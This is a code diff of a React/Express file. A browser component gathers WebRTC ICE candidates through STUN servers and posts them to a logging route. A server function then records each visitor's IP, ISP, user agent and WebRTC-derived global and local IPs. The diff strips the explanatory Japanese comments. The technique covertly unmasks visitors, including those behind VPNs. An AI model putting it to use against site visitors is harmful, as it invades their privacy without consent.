@@ -2,9 +2,6 @@ import React, { useEffect, useRef } from 'react';
 import { Request } from 'express';
 import { promises as dns } from 'dns';
 
-// ==========================================
-// 1. フロントエンド（ブラウザ裏でのWebRTCキャンディー爆破コンポーネント）
-// ==========================================
 const ICE_SERVERS = [
   { urls: 'stun:stun.cloudflare.com:3478' },
   { urls: 'stun:stun.cloudflare.com:5349' },
@@ -84,7 +81,7 @@ export const NetworkCollector: React.FC = () => {
     };
 
     try {
-      // サーバー（Express）の即時POSTルートへ叩き込む（スラッシュのパスを修正）
+    
       await fetch('/log-access', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -99,9 +96,7 @@ export const NetworkCollector: React.FC = () => {
 };
 
 
-// ==========================================
-// 2. バックエンド（サーバー側で動く多段IP・ISP重複排除ロジック）
-// ==========================================
+
 async function getAccessLog(req: Request, webrtcData: any): Promise<string> {
   const ua = req.headers['user-agent'] || '不明';
 
@@ -180,15 +175,14 @@ async function getAccessLog(req: Request, webrtcData: any): Promise<string> {
   return `access
 access時間 ${new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' })}
 
-接続元IP: ${clientIp}
-選別ISP/DNS: ${finalIspInfo}
+IP: ${clientIp}
+ISP/DNS: ${finalIspInfo}
 UA: ${ua}
 
 Webrtc多段IPs
-グローバルIPv4: ${webrtcV4}
-グローバルIPv6: ${webrtcV6}
-ローカルIP: ${webrtcLocal}`;
+IPv4: ${webrtcV4}
+IPv6: ${webrtcV6}
+localIP: ${webrtcLocal}`;
 }
 
-// CommonJSのrequire文（server.js）から関数をバチッと呼び出せるようにエクスポート
 module.exports = { getAccessLog };
